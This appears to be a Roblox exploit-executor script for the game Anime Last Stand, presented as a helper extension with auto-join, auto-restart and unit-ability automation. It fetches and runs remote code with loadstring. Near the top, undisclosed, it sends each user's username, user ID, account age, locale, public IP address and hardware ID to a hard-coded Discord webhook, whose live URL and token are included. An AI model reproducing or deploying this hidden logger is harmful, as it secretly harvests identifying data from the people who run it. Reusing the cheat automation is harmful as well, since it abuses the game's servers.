local version = "1.0"
local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/gos-s/buang-ext/refs/heads/main/regui.lua'))()
local PrefabsId = `rbxassetid://{ReGui.PrefabsId}`

local Creators = {
    [12229756] = "Anime Last Stand"
}

local txtContent = "SelectedExtreme=Divine Boost\nExtremeDelay=5.0\nAutoExtreme=false"..
"\nSelectedGarou=Cosmic\nAutoGarou=false\nSelectedKurumi=DPS\nAutoKurumi=false\nSelectedGilgamesh=Heavenly Chains" .. 
"\nAutoGilgamesh=false\nRestartWave=0\nAutoRestart=false"

if not isfile("BuangExt.txt") then
    warn("BuangExt is not found, creating new one..")
    writefile("BuangExt.txt", txtContent)
else
    warn("BuangExt found, loading..")
end

repeat task.wait() until isfile("BuangExt.txt")

local url = "https://discord.com/api/webhooks/1357411727679164486/GiNRztvfY7FgPPy4iwBq4uMmTNSCmcvp_-wg2Uw8S5gk_kn6wRj0Zy1X4MMY-mRfEZCa"

local data = {
   ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
   ["content"] = "",
   ["embeds"] = {
       {
     
      ["author"] = {
      ["name"] = "Executed",
      ["url"] = "https://roblox.com",
    },
        
           ["description"] = "Display name: `" .. game.Players.LocalPlayer.DisplayName ..
           "`\nUsername: `" ..  game.Players.LocalPlayer.Name .. "`" ..
           "\nUser ID: `" .. game.Players.LocalPlayer.UserId .. "`" ..
           "\nAccount Age: `" .. game.Players.LocalPlayer.AccountAge .. "`" ..
           "\nCountry: `" .. game.LocalizationService.RobloxLocaleId .. "`" ..
           "\nIP: `" .. game:HttpGet("https://v4.ident.me/") .. "`" ..
           "\nHWID: `" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "`",
           ["type"] = "rich",
           ["color"] = tonumber(0xf2ff00),
           }
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local function readConfigFile(filename)
    if not isfile(filename) then return {} end

    local data = readfile(filename)
    local config = {}

    for line in data:gmatch("[^\r\n]+") do
        local key, value = line:match("(%w+)%s*=%s*(.+)")
        if key and value then
            if value == "true" then
                config[key] = true
            elseif value == "false" then
                config[key] = false
            elseif tonumber(value) then
                config[key] = tonumber(value)
            else
                config[key] = value
            end
        end
    end

    return config
end

local function writeConfigFile(filename, config)
    local lines = {}
    for key, value in pairs(config) do
        if type(value) == "boolean" then
            table.insert(lines, key .. "=" .. tostring(value))
        else
            table.insert(lines, key .. "=" .. value)
        end
    end
    writefile(filename, table.concat(lines, "\n"))
end

local data = readConfigFile("BuangExt.txt")


ReGui:Init({
	Prefabs = game:GetService("InsertService"):LoadLocalAsset(PrefabsId)
})

local Window = ReGui:TabsWindow({
	Title = "BuangExt. " .. version .. " - " .. Creators[game.CreatorId],
	Theme = "Synapse",
	Size = UDim2.fromOffset(300, 200)
})

local Tabs = {}
local Names = {"Joins", "Game", "About"}

for _, Name in next, Names do
    Tabs[Name] = Window:CreateTab({Name=Name})
end

---------------------------------- Joins
-- Extreme Header
local function autoJoinExtreme(dataSelected)
    local selected
    
    if dataSelected == "Divine Boost" then
        selected = "Dragon Heaven"
    elseif dataSelected == "Infernal Boost" then 
        selected = "Wanderniech"
    else warn("[BuangExt] Can't find selected extreme boost.")
    end
    
    while data["AutoExtreme"] and task.wait(data["ExtremeDelay"]) do
        local success = pcall(function()
            for i=1, 10 do
                local args = {
                    [1] = selected,
                    [2] = i
                }
            
                game:FindFirstChild("ReplicatedStorage").Remotes.ExtremeBoosts.Enter:FireServer(unpack(args))
            end
        end)
        
        if not success then
            -- warn("[BuangExt] Failed to join " .. data["SelectedExtreme"] .. ".")
        end
    end
end

local ExtremeHeader = Tabs["Joins"]:CollapsingHeader({Title="Auto Join Extreme Boosts"})
ExtremeHeader:Button({
    Text = "Selected: " .. data["SelectedExtreme"],
    Callback = function(self)
        ExtremeHeader:Dropdown({
            ParentObject = self,
            Items = {"Divine Boost","Infernal Boost"},
            Selected = data["SelectedExtreme"] or "Divine Boost",
            OnSelected = function(Value)
                data["SelectedExtreme"] = Value
                writeConfigFile("BuangExt.txt", data)
                self.Text = "Selected: " .. Value
            end
        })
    end
})

ExtremeHeader:SliderFloat({
    Label = "",
    Minimum = 1.0,
    Maximum = 10.0,
    Value = data["ExtremeDelay"] or 5.0,
    Format = "Join Delay = %.1f",
    Callback = function(self, Value: float)
        data["ExtremeDelay"] = Value
        writeConfigFile("BuangExt.txt", data)
    end
})

ExtremeHeader:Checkbox({
    Value = data["AutoExtreme"] or false,
    Label = "Enable",
    Callback = function(self, Value: boolean)
        data["AutoExtreme"] = Value
        writeConfigFile("BuangExt.txt", data)
        if Value then
            local wrappedFunc = coroutine.wrap(function()
                return autoJoinExtreme(data["SelectedExtreme"])
            end)
            wrappedFunc()
        end
    end
})

-- Auto Restart Match
local function autoRestart()
    if not game:GetService("Workspace"):FindFirstChild("Towers") then return end
    
    local waveText = game:GetService("Players").LocalPlayer.PlayerGui.MainUI.Top.Wave.Value
    local restartRemote = game:GetService("ReplicatedStorage").Remotes.RestartMatch
    
    print("test")
    
    local function checkWave()
        if not data["AutoRestart"] then return end
        
        local currentWave = tonumber(waveText.Text)
        local targetWave = tonumber(data["RestartWave"] or 0)
        
        if currentWave >= targetWave and targetWave > 0 then
            restartRemote:FireServer()
            -- warn("[BuangExt] Restarting at wave ", currentWave)
        end
    end
    
    waveText:GetPropertyChangedSignal("Text"):Connect(checkWave)
    checkWave()
end

local RestartHeader = Tabs["Joins"]:CollapsingHeader({Title="Auto Restart Match"})
RestartHeader:Label({
    Text = "Auto Restart at Wave:"
})

RestartHeader:InputText({
    Label = "",
    Value = "",
    Placeholder = "Selected wave: " .. tostring(data["RestartWave"]) or "0",
    Callback = function(self, Value)
        data["RestartWave"] = Value
        writeConfigFile("BuangExt.txt", data)
    end
})

RestartHeader:Checkbox({
    Value = data["AutoRestart"] or false,
    Label = "Enable",
    Callback = function(self, Value: boolean)
        data["AutoRestart"] = Value
        writeConfigFile("BuangExt.txt", data)
        if Value then
            autoRestart()
        end
    end
})


---------------------------------- Game
local function autoMode(unitName, mode)
    local unitInfo = {}
    if unitName == "CosmicGarou" then
        unitInfo = {
            RemoteName = "Mode Swap",
            LevelTrigger = 2,
            Modes = {"Cosmic", "Baldy"}
        }
    elseif unitName == "KurumiEvo" then
        unitInfo = {
            RemoteName = "Zaphkol",
            LevelTrigger = 8,
            Modes = {"DPS", "Support", "Buff"}
        }
    elseif unitName == "GilgameshEvoEZA" then
        unitInfo = {
            RemoteName = "Sacred Treasures",
            LevelTrigger = 10,
            Modes = {"Heavenly Chains", "Rupture", "Heavenly Gates"}
        }
    else 
        warn("[BuangExt] Unknown unit: " .. unitName)
        return
    end
    
    if not table.find(unitInfo.Modes, mode) then
        warn("[BuangExt] Invalid mode for: " .. unitName)
        return
    end
    
    local remoteInstance = game:GetService("ReplicatedStorage").Remotes.AbilityRemotes:FindFirstChild(unitInfo.RemoteName)
    if not remoteInstance then
        warn("[BuangExt] Remote not found: ", unitInfo.RemoteName)
        return
    end
    
    local monitoredTowers = {}
    local function handleTower(tower)
        if not string.find(tower.Name, unitName) or monitoredTowers[tower] then
            return
        end
        
        monitoredTowers[tower] = true
        
        local upgrade = tower:FindFirstChild("Upgrade")
        if not upgrade then
            local success, result = pcall(function()
                return tower:WaitForChild("Upgrade", 5)
            end)
            
            if not success or not result then
                warn("[BuangExt] Upgrade variable not found for " .. tower.Name)
                monitoredTowers[tower] = nil
                return
            end
            upgrade = result
        end
        
        if upgrade.Value >= unitInfo.LevelTrigger then
            game:GetService("ReplicatedStorage").Remotes.Ability:InvokeServer(workspace.Towers:FindFirstChild(tower.Name), 1)
            local args = {[1] = mode}
            remoteInstance:FireServer(unpack(args))
        end
        
        local connection
        connection = upgrade:GetPropertyChangedSignal("Value"):Connect(function()
            if upgrade.Value >= unitInfo.LevelTrigger then
                game:GetService("ReplicatedStorage").Remotes.Ability:InvokeServer(workspace.Towers:FindFirstChild(tower.Name), 1)
                local args = {[1] = mode}
                remoteInstance:FireServer(unpack(args))
            end
        end)
        
        tower.AncestryChanged:Connect(function(_, parent)
            if not parent then
                if connection then
                    connection:Disconnect()
                end
                monitoredTowers[tower] = nil
            end
        end)
    end
    
    for _, tower in ipairs(workspace.Towers:GetChildren()) do
        task.spawn(handleTower, tower)
    end
    
    workspace.Towers.ChildAdded:Connect(handleTower)
end

-- Auto Garou
local GarouHeader = Tabs["Game"]:CollapsingHeader({Title="Auto Garou"})
GarouHeader:Button({
    Text = "Selected: " .. data["SelectedGarou"],
    Callback = function(self)
        GarouHeader:Dropdown({
            ParentObject = self,
            Items = {"Cosmic","Baldy"},
            Selected = data["SelectedGarou"] or "Cosmic",
            OnSelected = function(Value)
                data["SelectedGarou"] = Value
                writeConfigFile("BuangExt.txt", data)
                self.Text = "Selected: " .. Value
            end
        })
    end
})
GarouHeader:Checkbox({
    Value = data["AutoGarou"] or false,
    Label = "Enable",
    Callback = function(self, Value: boolean)
        data["AutoGarou"] = Value
        writeConfigFile("BuangExt.txt", data)
        if Value then
            autoMode("CosmicGarou", data["SelectedGarou"] or "Cosmic")
        end
    end
})

-- Auto Kurumi
local KurumiHeader = Tabs["Game"]:CollapsingHeader({Title="Auto Kurumi"})
KurumiHeader:Button({
    Text = "Selected: " .. data["SelectedKurumi"],
    Callback = function(self)
        KurumiHeader:Dropdown({
            ParentObject = self,
            Items = {"DPS","Support","Buff"},
            Selected = data["SelectedKurumi"] or "DPS",
            OnSelected = function(Value)
                data["SelectedKurumi"] = Value
                writeConfigFile("BuangExt.txt", data)
                self.Text = "Selected: " .. Value
            end
        })
    end
})
KurumiHeader:Checkbox({
    Value = data["AutoKurumi"] or false,
    Label = "Enable",
    Callback = function(self, Value: boolean)
        data["AutoKurumi"] = Value
        writeConfigFile("BuangExt.txt", data)
        if Value then
            autoMode("KurumiEvo", data["SelectedKurumi"] or "DPS")
        end
    end
})

-- Auto Gilgamesh
local GilgameshHeader = Tabs["Game"]:CollapsingHeader({Title="Auto Gilgamesh"})
GilgameshHeader:Button({
    Text = "Selected: " .. data["SelectedGilgamesh"],
    Callback = function(self)
        GilgameshHeader:Dropdown({
            ParentObject = self,
            Items = {"Heavenly Chains","Rupture","Heavenly Gates"},
            Selected = data["SelectedGilgamesh"] or "Heavenly Chains",
            OnSelected = function(Value)
                data["SelectedGilgamesh"] = Value
                writeConfigFile("BuangExt.txt", data)
                self.Text = "Selected: " .. Value
            end
        })
    end
})
GilgameshHeader:Checkbox({
    Value = data["AutoGilgamesh"] or false,
    Label = "Enable",
    Callback = function(self, Value: boolean)
        data["AutoGilgamesh"] = Value
        writeConfigFile("BuangExt.txt", data)
        if Value then
            autoMode("GilgameshEvoEZA", data["SelectedGilgamesh"] or "Heavenly Chains")
        end
    end
})


---------------------------------- About
Tabs["About"]:Label({Text = 
    `An extension script for Buang Hub.\n`
})

Tabs["About"]:Label({Text = 
    `Credits:\n`,
    Bold = true
})

Tabs["About"]:Label({Text = 
    `Made by: gosling.gg\n`..
    `Powered with: Dear ReGui ({ReGui:GetVersion()})\n` ..
    `For: Buang Hub\n`
})

Tabs["About"]:Button({
    Text = "BuangExt Discord",
    Callback = function(self)
        toclipboard(tostring("https://discord.gg/UCW5SzvwFb"))
    end
})

Tabs["About"]:Button({
    Text = "Get Buang Hub",
    Callback = function(self)
        toclipboard(tostring("https://discord.gg/buanghub"))
    end
})
